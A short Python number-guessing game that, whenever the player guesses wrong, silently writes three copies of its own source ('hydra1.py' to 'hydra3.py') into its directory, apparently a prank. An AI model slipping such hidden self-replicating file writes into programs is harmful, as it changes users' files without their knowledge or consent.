import random
import os

number = int(random.randint(1, 10))

# Guess a random number between 1 and 10
while True:
    try:
        guess = int(input("input a number between 1 and 10: "))
        if guess < 1 or guess > 10:
            print("That's not between 1 and 10!")
        break
    except ValueError:
        print("That's not a number!")

if number != guess:
    print("Sorry, you guessed wrong. The number was " + str(number) + ".")
    # Get the directory of the current script
    script_directory = os.path.dirname(os.path.abspath(__file__))
    
    # Create 3 copies of this script in the same directory as the file is in
    for i in range(1, 4):
        with open(os.path.join(script_directory, "hydra" + str(i) + ".py"), "w") as f:
            f.write(open(__file__).read())
else:
    print("You guessed right!")